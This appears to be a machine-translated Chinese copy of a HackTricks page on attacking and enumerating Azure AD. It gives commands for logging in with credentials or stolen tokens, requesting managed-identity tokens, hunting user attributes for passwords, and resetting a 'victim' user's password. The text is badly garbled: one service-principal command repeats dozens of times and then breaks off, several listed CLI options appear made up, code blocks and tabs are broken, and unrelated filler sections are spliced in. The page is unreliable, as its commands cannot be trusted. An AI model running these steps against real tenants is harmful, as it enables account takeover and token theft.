# Az - AzureAD

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

### 枚举

对于这个枚举，您可以使用 [**az cli 工具**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)**，**[**AzureAD PowerShell 模块**](https://www.powershellgallery.com/packages/AzureAD/)（或 [**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)）和 [**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) 模块。

{% hint style="success" %}
在 Linux 上，您需要安装 PowerShell Core:
```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% tab title="az cli" %}### **连接**

```bash
az login
```

使用此命令登录到 Azure 帐户。您将被要求在浏览器中输入 Azure 帐户的凭据。

```bash
az account set --subscription <subscription_id>
```

使用此命令设置要使用的 Azure 订阅。

```bash
az ad signed-in-user show --query objectId -o tsv
```

使用此命令获取当前已登录用户的 Azure AD 对象 ID。

```bash
az ad sp create-for-rbac --name <name> --role <role> --scopes <scopes> --sdk-auth
```

使用此命令创建用于 Azure RBAC 的服务主体，并生成用于身份验证的 SDK 配置文件。

```bash
az ad sp create-for-rbac --name <name> --role <role> --scopes <scopes> --sdk-auth --years <years>
```

使用此命令创建用于 Azure RBAC 的服务主体，并生成用于身份验证的 SDK 配置文件，并指定有效期。

```bash
az ad sp credential reset --name <name> --password <password>
```

使用此命令重置服务主体的凭据。

```bash
az ad sp delete --id <id>
```

使用此命令删除指定的服务主体。

```bash
az ad sp list --display-name <display_name> --query "[].{name:appDisplayName, objectId:objectId}"
```

使用此命令根据显示名称获取服务主体的名称和对象 ID。

```bash
az ad sp show --id <id>
```

使用此命令获取指定服务主体的详细信息。

```bash
az ad sp update --id <id> --set <property=value>
```

使用此命令更新指定服务主体的属性。

```bash
az ad sp update --id <id> --add <property=value>
```

使用此命令添加指定服务主体的属性。

```bash
az ad sp update --id <id> --remove <property>
```

使用此命令删除指定服务主体的属性。

```bash
az ad sp update --id <id> --force-change-password-next-login
```

使用此命令强制指定服务主体在下次登录时更改密码。

```bash
az ad sp update --id <id> --password <password>
```

使用此命令更改指定服务主体的密码。

```bash
az ad sp update --id <id> --set keyPermissions=<permissions>
```

使用此命令设置指定服务主体的密钥权限。

```bash
az ad sp update --id <id> --set secretPermissions=<permissions>
```

使用此命令设置指定服务主体的密钥权限。

```bash
az ad sp update --id <id> --set oauth2Permissions=<permissions>
```

使用此命令设置指定服务主体的 OAuth2 权限。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set replyUrls=<urls>
```

使用此命令设置指定服务主体的回复 URL。

```bash
az ad sp update --id <id> --set homepage=<url>
```

使用此命令设置指定服务主体的主页 URL。

```bash
az ad sp update --id <id> --set identifierUris=<uris>
```

使用此命令设置指定服务主体的标识符 URI。

```bash
az ad sp update --id <id> --set appDisplayName=<name>
```

使用此命令设置指定服务主体的应用显示名称。

```bash
az ad sp update --id <id> --set appOwnerTenantId=<tenant_id>
```

使用此命令设置指定服务主体的应用所有者租户 ID。

```bash
az ad sp update --id <id> --set appRoleAssignmentRequired=<true|false>
```

使用此命令设置指定服务主体是否需要应用角色分配。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles>
```

使用此命令设置指定服务主体的应用角色。

```bash
az ad sp update --id <id> --set appRoles=<roles
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% endtab %}

{% tab title="Azure AD" %}
{% code overflow="wrap" %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
以下是有关Azure Active Directory的一些常见安全问题和攻击技术。

## 1. 用户密码泄露

### 描述

用户密码泄露是指用户的登录凭据（用户名和密码）被未经授权的人员获取的情况。这可能会导致攻击者获取对用户帐户的访问权限，并可能导致进一步的攻击。

### 防御措施

- 强制用户使用强密码，并定期更改密码。
- 启用多因素身份验证（MFA）以提供额外的安全层。
- 监控和检测异常登录活动，并及时采取措施。

## 2. 身份欺骗

### 描述

身份欺骗是指攻击者冒充合法用户或实体，以获取对系统或资源的访问权限。这可能通过钓鱼攻击、社交工程或使用被盗的凭据实现。

### 防御措施

- 提供员工培训，以增强对钓鱼攻击和社交工程的识别能力。
- 实施强身份验证措施，如MFA或单一登录（SSO）。
- 定期审查和更新用户权限。

## 3. 令牌泄露

### 描述

令牌泄露是指攻击者获取到有效的访问令牌，从而能够冒充合法用户访问系统或资源。这可能是由于不正确的配置、漏洞或恶意软件导致的。

### 防御措施

- 定期审查和更新应用程序的访问令牌。
- 实施访问令牌的有效期限和访问范围限制。
- 监控和检测异常的令牌使用活动。

## 4. 权限提升

### 描述

权限提升是指攻击者通过获取更高权限级别，从而能够访问系统或资源中的敏感信息或执行特权操作。

### 防御措施

- 实施最小权限原则，仅为用户分配所需的最低权限。
- 定期审查和更新用户权限。
- 监控和检测异常的权限提升活动。

## 5. 数据泄露

### 描述

数据泄露是指未经授权的披露或泄露敏感数据的情况。这可能是由于配置错误、漏洞或恶意行为导致的。

### 防御措施

- 定期审查和更新数据访问权限。
- 实施数据分类和加密措施。
- 监控和检测异常的数据访问活动。

## 6. API滥用

### 描述

API滥用是指攻击者利用API的漏洞或不安全配置，执行未经授权的操作或访问敏感数据。

### 防御措施

- 定期审查和更新API的访问权限。
- 实施API访问控制和身份验证措施。
- 监控和检测异常的API活动。

## 7. 不安全的配置

### 描述

不安全的配置是指系统或资源的配置存在漏洞或不安全设置，可能导致未经授权的访问或数据泄露。

### 防御措施

- 定期审查和更新系统或资源的配置。
- 实施安全最佳实践和建议。
- 监控和检测异常的配置更改。

## 8. 漏洞利用

### 描述

漏洞利用是指攻击者利用系统或应用程序中的已知或未知漏洞，执行未经授权的操作或获取敏感信息。

### 防御措施

- 定期更新系统和应用程序，以修复已知漏洞。
- 实施漏洞扫描和漏洞管理流程。
- 监控和检测异常的漏洞利用活动。

## 9. DDOS攻击

### 描述

DDOS（分布式拒绝服务）攻击是指攻击者通过占用系统资源或网络带宽，使系统无法正常提供服务。

### 防御措施

- 实施DDOS防护措施，如流量分析和过滤。
- 监控和检测异常的网络流量。
- 准备应急响应计划，以应对DDOS攻击。

## 10. 社交工程

### 描述

社交工程是指攻击者通过欺骗、操纵或诱导人员，以获取敏感信息或执行未经授权的操作。

### 防御措施

- 提供员工培训，以增强对社交工程攻击的识别能力。
- 实施安全意识培训和策略。
- 监控和检测异常的用户行为。

{% endcode %}
{% endtab %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="原始操作系统" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% code %}
{% endcode %}
{% endtab %}
{% endtabs %}

当您使用任何程序通过CLI登录到Azure时，您使用的是属于Microsoft的租户的Azure应用程序。这些应用程序，就像您可以在您的帐户中创建的应用程序一样，都有一个客户端ID。您无法在控制台中看到所有这些应用程序的“允许应用程序列表”，但它们默认是允许的。

例如，一个使用客户端ID为`1950a258-227b-4e31-a9cf-717495945fc2`的应用程序的powershell脚本进行身份验证。即使该应用程序在控制台中不可见，系统管理员也可以阻止用户使用通过该应用程序连接的工具进行访问。

然而，还有其他客户端ID的应用程序将允许您连接到Azure：
```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```
### 用户

{% tabs %}
{% tab title="az cli" %}
```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```
{% endtab %}

{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是微软提供的云身份验证和授权服务。它用于管理用户、组织和应用程序的身份验证和访问控制。Azure AD 提供了一种集中式的身份验证和授权解决方案，可用于保护 Azure 云服务和其他 SaaS 应用程序。

## Azure AD 基本概念

以下是 Azure AD 的一些基本概念：

- **租户（Tenant）**：Azure AD 的顶级组织单位，可以是一个公司、学校或政府机构。每个租户都有一个唯一的标识符（租户 ID）。
- **目录（Directory）**：每个租户都包含一个目录，用于存储和管理用户、组织和应用程序的信息。
- **用户（User）**：租户中的个人用户，可以通过用户名和密码或其他身份验证方法进行身份验证。
- **组（Group）**：一组用户的集合，可以方便地管理和授权访问权限。
- **应用程序（Application）**：在 Azure AD 中注册的应用程序，可以是本地应用程序、Web 应用程序或其他 SaaS 应用程序。
- **服务主体（Service Principal）**：代表应用程序或服务的身份验证实体，用于访问受保护的资源。

## Azure AD 安全性

Azure AD 提供了多种安全功能和控制措施，以保护用户和组织的身份验证和访问控制。以下是一些常见的 Azure AD 安全性功能：

- **多因素身份验证（MFA）**：要求用户在登录时提供多个身份验证因素，以增加身份验证的安全性。
- **条件访问（Conditional Access）**：根据用户、设备、位置等条件对访问进行控制，以确保只有经过授权的用户可以访问资源。
- **密码策略（Password Policy）**：定义密码的复杂性要求和过期策略，以增加密码的安全性。
- **安全报告（Security Reports）**：提供有关身份验证和访问活动的详细报告和分析，以便及时检测和响应安全事件。

## Azure AD 漏洞利用

在进行 Azure AD 渗透测试时，可以利用以下漏洞和技术来获取未授权访问、提权或窃取敏感信息：

- **密码喷洒（Password Spraying）**：尝试使用常见密码对多个用户进行身份验证，以猜测正确的密码。
- **暴力破解（Brute Force）**：尝试使用所有可能的密码组合对单个用户进行身份验证，以猜测正确的密码。
- **令牌窃取（Token Theft）**：通过劫持用户的身份验证令牌，获取对 Azure AD 资源的未授权访问。
- **SSO 漏洞（SSO Vulnerabilities）**：利用单点登录（SSO）配置错误或漏洞，获取对其他 SaaS 应用程序的未授权访问。
- **应用程序漏洞（Application Vulnerabilities）**：利用注册在 Azure AD 中的应用程序的漏洞，获取对资源的未授权访问。

## Azure AD 安全建议

以下是一些保护 Azure AD 安全性的最佳实践：

- **启用多因素身份验证（MFA）**：为所有用户启用 MFA，以增加身份验证的安全性。
- **限制管理员权限**：仅授予必要的管理员权限，并定期审查和更新权限。
- **监控和报告**：定期监控和审查 Azure AD 的安全报告，及时检测和响应安全事件。
- **更新应用程序**：定期更新和修补注册在 Azure AD 中的应用程序，以修复已知的漏洞。
- **教育和培训**：为用户提供有关安全最佳实践和威胁意识的教育和培训。

## 参考资料

- [Azure AD 官方文档](https://docs.microsoft.com/azure/active-directory/)
- [Azure AD 安全最佳实践](https://docs.microsoft.com/azure/active-directory/fundamentals/best-practices-security-and-compliance)
```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```
{% tab title="Az PowerShell" %}

Azure Active Directory (Azure AD) 是 Azure 中的身份验证和访问管理服务。它允许组织管理用户、组和应用程序，并控制对 Azure 资源的访问权限。

以下是一些常见的 Azure AD PowerShell 命令：

- `Connect-AzureAD`：连接到 Azure AD。
- `Get-AzureADUser`：获取 Azure AD 中的用户。
- `Get-AzureADGroup`：获取 Azure AD 中的组。
- `Get-AzureADApplication`：获取 Azure AD 中的应用程序。
- `New-AzureADUser`：创建新的 Azure AD 用户。
- `New-AzureADGroup`：创建新的 Azure AD 组。
- `New-AzureADApplication`：创建新的 Azure AD 应用程序。
- `Set-AzureADUser`：更新 Azure AD 用户的属性。
- `Set-AzureADGroup`：更新 Azure AD 组的属性。
- `Set-AzureADApplication`：更新 Azure AD 应用程序的属性。
- `Remove-AzureADUser`：删除 Azure AD 用户。
- `Remove-AzureADGroup`：删除 Azure AD 组。
- `Remove-AzureADApplication`：删除 Azure AD 应用程序。

使用这些命令，您可以执行各种 Azure AD 相关的操作，如创建、更新和删除用户、组和应用程序。

{% endtab %}
```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```
{% endtab %}
{% endtabs %}

#### 更改用户密码

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText –Force

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password –Verbose
```
{% tabs %}
{% tab title="az cli" %}

### 组

#### 列出所有组

```bash
az ad group list --query '[].{displayName:displayName, objectId:objectId}'
```

#### 获取组的详细信息

```bash
az ad group show --group <group_object_id>
```

#### 创建组

```bash
az ad group create --display-name <group_display_name> --mail-nickname <group_mail_nickname>
```

#### 更新组

```bash
az ad group update --group <group_object_id> --display-name <new_group_display_name>
```

#### 删除组

```bash
az ad group delete --group <group_object_id>
```

#### 将用户添加到组

```bash
az ad group member add --group <group_object_id> --member-id <user_object_id>
```

#### 从组中删除用户

```bash
az ad group member remove --group <group_object_id> --member-id <user_object_id>
```

#### 列出组的成员

```bash
az ad group member list --group <group_object_id> --query '[].{displayName:displayName, objectId:objectId}'
```

#### 列出用户所属的组

```bash
az ad user get-member-groups --upn-or-object-id <user_upn_or_object_id> --query '[].{displayName:displayName, objectId:objectId}'
```

#### 列出组的所有者

```bash
az ad group owner list --group <group_object_id> --query '[].{displayName:displayName, objectId:objectId}'
```

#### 将用户添加为组的所有者

```bash
az ad group owner add --group <group_object_id> --owner-object-id <user_object_id>
```

#### 从组中删除所有者

```bash
az ad group owner remove --group <group_object_id> --owner-object-id <user_object_id>
```

{% endtab %}
{% endtabs %}
```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```
{% tab title="Azure AD" %}Azure AD（Azure Active Directory）是微软提供的云身份验证和访问管理服务。它用于管理用户、组织和应用程序的身份验证和授权。Azure AD 提供了一系列功能，包括单一登录、多因素身份验证、访问控制和身份验证日志记录等。

## Azure AD 漏洞利用

### 1. Azure AD 注册应用程序

